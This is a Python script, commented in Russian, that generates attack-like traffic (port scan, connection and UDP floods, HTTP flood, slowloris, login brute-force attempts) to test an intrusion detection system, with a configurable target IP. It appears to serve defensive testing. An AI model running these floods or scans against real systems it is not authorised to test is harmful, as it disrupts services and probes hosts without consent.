#!/usr/bin/env python3
"""
Локальная симуляция сетевых атак для тестирования IDS
Генерирует трафик похожий на атаки
"""

import socket
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse
import struct


def get_local_ip():
    """Получает локальный IP"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


class AttackSimulator:
    """Симулятор атак"""

    def __init__(self, target_ip: str = None, verbose: bool = True):
        self.target_ip = target_ip or get_local_ip()
        self.verbose = verbose
        self._stop = False

    def log(self, msg):
        if self.verbose:
            print(f"  {msg}")

    def port_scan(self, port_range: tuple = (1, 1024), delay: float = 0.005):
        """
        Сканирование портов - характерный паттерн для PortScan атаки
        """
        print(f"\n[PORT SCAN] Scanning {self.target_ip} ports {port_range[0]}-{port_range[1]}")

        open_ports = []
        start_port, end_port = port_range

        for port in range(start_port, end_port + 1):
            if self._stop:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.target_ip, port))
                if result == 0:
                    open_ports.append(port)
                    self.log(f"Port {port}: OPEN")
                sock.close()
            except:
                pass
            time.sleep(delay)

        print(f"[PORT SCAN] Complete. Open ports: {open_ports}")
        return open_ports

    def syn_flood(self, target_port: int = 80, count: int = 1000,
                  threads: int = 20):
        """
        SYN Flood - множество TCP соединений
        Похоже на DoS атаку
        """
        print(f"\n[SYN FLOOD] Target: {self.target_ip}:{target_port}, connections: {count}")

        sent = [0]
        errors = [0]

        def send_syn():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.05)
                sock.connect_ex((self.target_ip, target_port))
                time.sleep(0.01)
                sock.close()
                sent[0] += 1
            except:
                errors[0] += 1

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for i in range(count):
                if self._stop:
                    break
                executor.submit(send_syn)

                if i % 200 == 0 and i > 0:
                    self.log(f"Sent {i}/{count} connections")

        print(f"[SYN FLOOD] Complete. Sent: {sent[0]}, Errors: {errors[0]}")

    def udp_flood(self, target_port: int = 53, count: int = 1000,
                  packet_size: int = 512):
        """
        UDP Flood - множество UDP пакетов
        """
        print(f"\n[UDP FLOOD] Target: {self.target_ip}:{target_port}, packets: {count}")

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random.randbytes(packet_size)

        sent = 0
        for i in range(count):
            if self._stop:
                break
            try:
                sock.sendto(data, (self.target_ip, target_port))
                sent += 1
            except:
                pass

            if i % 200 == 0 and i > 0:
                self.log(f"Sent {i}/{count} packets")

        sock.close()
        print(f"[UDP FLOOD] Complete. Sent: {sent} packets")

    def http_flood(self, target_port: int = 80, count: int = 200):
        """
        HTTP Flood - множество HTTP запросов
        """
        print(f"\n[HTTP FLOOD] Target: {self.target_ip}:{target_port}, requests: {count}")

        sent = 0

        for i in range(count):
            if self._stop:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((self.target_ip, target_port))

                # Отправляем HTTP запрос
                request = (
                    f"GET /?q={random.randint(0, 99999)} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: Mozilla/5.0 (Attack Test {i})\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n\r\n"
                )
                sock.send(request.encode())
                sock.close()
                sent += 1
            except:
                pass

            time.sleep(0.01)

            if i % 50 == 0 and i > 0:
                self.log(f"Sent {i}/{count} requests")

        print(f"[HTTP FLOOD] Complete. Sent: {sent} requests")

    def slowloris(self, target_port: int = 80, sockets_count: int = 50,
                  duration: int = 20):
        """
        Slowloris - держим соединения открытыми
        Характерно для DoS slowloris
        """
        print(f"\n[SLOWLORIS] Target: {self.target_ip}:{target_port}, "
              f"sockets: {sockets_count}, duration: {duration}s")

        sockets = []

        # Создаём соединения
        for _ in range(sockets_count):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, target_port))
                s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.target_ip}\r\n".encode())
                sockets.append(s)
            except:
                pass

        self.log(f"Created {len(sockets)} connections")

        # Держим открытыми
        start = time.time()
        while time.time() - start < duration and not self._stop:
            for s in sockets[:]:
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(s)

            self.log(f"Active: {len(sockets)} sockets")
            time.sleep(1)

        for s in sockets:
            try:
                s.close()
            except:
                pass

        print(f"[SLOWLORIS] Complete")

    def brute_force_simulation(self, target_port: int = 22, attempts: int = 50):
        """
        Симуляция brute force - множество попыток подключения
        """
        print(f"\n[BRUTE FORCE] Target: {self.target_ip}:{target_port}, attempts: {attempts}")

        for i in range(attempts):
            if self._stop:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((self.target_ip, target_port))
                # Имитируем попытку авторизации
                sock.send(f"USER admin{i}\r\n".encode())
                time.sleep(0.1)
                sock.send(f"PASS password{i}\r\n".encode())
                sock.close()
            except:
                pass

            time.sleep(0.2)

            if i % 10 == 0:
                self.log(f"Attempt {i}/{attempts}")

        print(f"[BRUTE FORCE] Complete")

    def mixed_attack(self, duration: int = 60):
        """
        Смешанная атака - разные типы одновременно
        """
        print(f"\n[MIXED ATTACK] Duration: {duration}s")
        print("  Running: Port Scan + SYN Flood + UDP Flood")

        threads = []

        # Port scan в фоне
        t1 = threading.Thread(target=self.port_scan,
                              kwargs={'port_range': (1, 500), 'delay': 0.02})
        threads.append(t1)

        # SYN flood
        t2 = threading.Thread(target=self.syn_flood,
                              kwargs={'target_port': 80, 'count': 500})
        threads.append(t2)

        # UDP flood
        t3 = threading.Thread(target=self.udp_flood,
                              kwargs={'target_port': 53, 'count': 500})
        threads.append(t3)

        for t in threads:
            t.start()

        # Ждём или прерываем
        start = time.time()
        while time.time() - start < duration:
            if self._stop:
                break
            time.sleep(1)

        self._stop = True

        for t in threads:
            t.join(timeout=5)

        print(f"[MIXED ATTACK] Complete")

    def stop(self):
        self._stop = True


def main():
    parser = argparse.ArgumentParser(
        description='Local Attack Simulation for IDS Testing'
    )

    parser.add_argument('-t', '--target', type=str, default=None,
                        help='Target IP (default: local IP)')
    parser.add_argument('-a', '--attack',
                        choices=['portscan', 'syn', 'udp', 'http', 'slowloris',
                                 'brute', 'mixed', 'all'],
                        default='all',
                        help='Attack type')
    parser.add_argument('-p', '--port', type=int, default=80,
                        help='Target port')
    parser.add_argument('-c', '--count', type=int, default=500,
                        help='Number of packets/connections')
    parser.add_argument('-d', '--duration', type=int, default=30,
                        help='Duration for timed attacks')
    parser.add_argument('-q', '--quiet', action='store_true',
                        help='Less output')

    args = parser.parse_args()

    target = args.target or get_local_ip()

    print("=" * 60)
    print("    ATTACK SIMULATION FOR IDS TESTING")
    print("=" * 60)
    print(f"  Target: {target}")
    print(f"  Attack: {args.attack}")
    print("=" * 60)
    print()
    print("  Make sure the IDS analyzer is running!")
    print("  Press Ctrl+C to stop")
    print()

    time.sleep(2)

    sim = AttackSimulator(target, verbose=not args.quiet)

    try:
        if args.attack == 'portscan':
            sim.port_scan(port_range=(1, args.count))

        elif args.attack == 'syn':
            sim.syn_flood(target_port=args.port, count=args.count)

        elif args.attack == 'udp':
            sim.udp_flood(target_port=args.port, count=args.count)

        elif args.attack == 'http':
            sim.http_flood(target_port=args.port, count=args.count)

        elif args.attack == 'slowloris':
            sim.slowloris(target_port=args.port, duration=args.duration)

        elif args.attack == 'brute':
            sim.brute_force_simulation(target_port=args.port, attempts=args.count)

        elif args.attack == 'mixed':
            sim.mixed_attack(duration=args.duration)

        elif args.attack == 'all':
            print("Running ALL attack types sequentially...\n")

            # 1. Port scan
            sim.port_scan(port_range=(1, 200))
            time.sleep(2)

            # 2. SYN flood
            sim.syn_flood(target_port=80, count=300)
            time.sleep(2)

            # 3. UDP flood
            sim.udp_flood(target_port=53, count=300)
            time.sleep(2)

            # 4. HTTP flood
            sim.http_flood(target_port=80, count=100)
            time.sleep(2)

            # 5. Brute force
            sim.brute_force_simulation(target_port=22, attempts=30)

            print("\n" + "=" * 60)
            print("ALL ATTACKS COMPLETE")
            print("=" * 60)

    except KeyboardInterrupt:
        print("\n\nStopping...")
        sim.stop()

    print("\nDone! Check the IDS analyzer output.")


if __name__ == "__main__":
    main()